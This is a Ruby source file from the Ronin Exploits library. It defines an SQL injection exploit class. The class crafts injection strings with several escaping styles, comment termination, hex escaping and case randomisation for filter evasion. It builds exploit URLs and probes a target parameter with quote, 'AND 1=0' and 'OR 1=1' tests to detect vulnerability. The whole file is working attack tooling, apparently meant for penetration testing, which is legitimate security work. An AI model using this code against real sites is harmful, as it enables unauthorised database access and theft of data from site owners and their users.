#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2012 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/exploits/web'
require 'ronin/code/sql'

module Ronin
  module Exploits
    class SQLi < Web

      # The type of escaping technique to use
      property :escape, String, :set => [
        nil, 'string', 'column', 'parenthesis', 'statement'
      ]

      # The type of String quotation to use
      property :quotes, String, :set     => ['single', 'double', 'tick'],
                                :default => 'single'

      # Whether or not to terminate the String with a SQL comment
      property :terminate, Boolean

      # Controls case-randomization of table/function names
      parameter :case, :type        => Symbol,
                       :default     => :none,
                       :description => 'Case (none, lower, upper, random)'

      # Controls whether to hex-escape the SQL string
      parameter :hex_escape, :type        => true,
                             :description => 'Hex-escapes all Strings'

      # Controls whether less or more parentheses are included in the SQL
      parameter :parens, :type        => Symbol,
                         :default     => :more,
                         :description => 'Parentheses (less or more)'

      # Controls whether spaces or other kinds of white-space are used to
      # separate keywords.
      parameter :space, :type        => true,
                        :default     => true,
                        :description => 'Enables or disables whitespace'

      #
      # The SQL formatter based on the exploit settings.
      #
      # @return [Code::SQL::Formatter]
      #   The SQL formatter.
      #
      def formatter
        Code::SQL::Formatter.new(
          :case       => self.case,
          :quotes     => self.quotes.to_sym,
          :hex_escape => self.hex_escape,
          :parens     => self.parens,
          :space      => self.space
        )
      end

      #
      # The value of the targeted query-param.
      #
      # @return [String]
      #   The value.
      #
      def url_query_param_value
        @url_query_param_value ||= (
          URI::QueryParams.parse(self.url_query)[self.url_query_param.name].to_s
        )
      end

      #
      # Escapes a SQL expression for injection.
      #
      # @param [Code::SQL::Formattable, #to_sql, #to_s] sql
      #   The SQL expression to be injected.
      #
      # @return [String]
      #   The SQL injection String.
      #
      def escape_sql(sql)
        fmt = formatter
        sql = fmt.format(sql)

        case self.escape
        when 'string'
          sqli = fmt.join(url_query_param_value + fmt.quote, sql)

          # if were are not terminating the SQLi
          unless self.terminate?
            sqli = if sqli.end_with?(fmt.quote)
                     # remove the trailing quote character
                     sqli.chomp(fmt.quote)
                   else
                     # and an extra 'AND' keyword and another quote character
                     fmt.join(sqli, fmt.keyword(:and), fmt.quote)
                   end
          end
        when 'columns'
          sqli = fmt.join("#{url_query_param_value}`", sql, '--')
        when 'parenthesis'
          sqli = fmt.join("#{url_query_param_value})", sql, '--')
        when 'statement'
          sqli = fmt.join("#{url_query_param_value};", sql, '--')
        else
          sqli = fmt.join(url_query_param_value, sql)
        end

        # comment-terminate the SQLi, unless already terminated
        sqli << '--' if (self.terminate? && !sqli.end_with?('--'))

        return sqli
      end

      #
      # Creates an exploit URL which inject the SQL.
      #
      # @param [Code::SQL::Formattable, #to_sql, #to_s] sql
      #   The SQL expression to inject.
      #
      # @param [Hash] query_params
      #   Additional query params.
      #
      # @return [URI::HTTP]
      #   The exploit URL.
      #
      def exploit_url(sql,query_params={})
        super(escape_sql(sql),query_params)
      end

      #
      # Tests for SQL injection by appending tick marks (`'`, `"`, `\``).
      #
      # @return [Boolean]
      #   Specifies if SQL injection was detected.
      #
      def test_quotes
        %w[' " `].any? { |quote| exploit(quote).code == '500' }
      end

      #
      # Tests for SQL injection by appending ` AND 1=0`.
      #
      # @return [Boolean]
      #   Specifies if SQL injection was detected.
      #
      def test_and_false
        sql = Code.sql[:and, 1, :eq, 0]

        normal_response.content_length > exploit(sql).content_length
      end

      #
      # Tests for SQL injection by appending ` OR 1=1`.
      #
      # @return [Boolean]
      #   Specifies if SQL injection was detected.
      #
      def test_or_true
        sql = Code.sql[:or, 1, :eq, 1]

        normal_response.content_length < exploit(sql).content_length
      end

      #
      # Tests whether the URL is vulnerable to SQL injection.
      #
      # @return [Boolean]
      #   Specifies if SQL injection was detected.
      #
      # @see #test_and_false
      # @see #test_or_true
      # @see #test_quotes
      #
      def vulnerable?
        test_or_true    ||
        test_and_false  ||
        test_quotes
      end

    end
  end
end
